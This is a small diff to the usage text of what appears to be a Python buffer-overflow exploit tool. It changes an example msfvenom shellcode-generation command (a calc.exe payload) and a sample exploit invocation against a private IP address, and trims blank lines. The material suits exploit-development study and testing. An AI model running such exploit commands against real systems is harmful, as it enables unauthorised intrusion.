@@ -33,9 +33,9 @@ def printUsage(scriptName):
 	print("")
 
 	print("	exploit - Sends malicious payload via buffer overflow")
-	print("	Shellcode example: msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f python -v payload EXITFUNC=thread -o shellCodeFile")
+	print("	Shellcode example: msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f python -v payload EXITFUNC=thread -o myfile.py")
 	print("	{} exploit remoteHost remotePort buffSize buffHead eipContent eipOffset nops shellCodeFile".format(scriptName))
-	print("	{} exploit 10.2.31.155 2048 5009 hello 01010101 1203 10 payload".format(scriptName))
+	print("	{} exploit 10.2.31.155 2048 5009 hello 01010101 1203 10 myfile".format(scriptName))
 	print("")
 
 # Create payload based on mode and script arguments
@@ -261,16 +261,4 @@ except:
 	raise
 finally:
 	s.close()
-
-
-
-
-
-
-
-
-
-
-
-
 
